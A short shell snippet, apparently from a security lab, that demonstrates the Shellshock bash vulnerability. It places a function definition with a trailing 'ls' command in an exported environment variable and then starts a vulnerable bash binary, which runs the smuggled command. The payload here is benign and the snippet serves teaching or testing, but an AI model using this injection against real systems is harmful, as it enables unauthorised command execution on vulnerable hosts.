foo='() { echo "hello world"; }; ls;'
echo $foo
export foo
../image_www/bash_shellshock
declare -f foo
foo
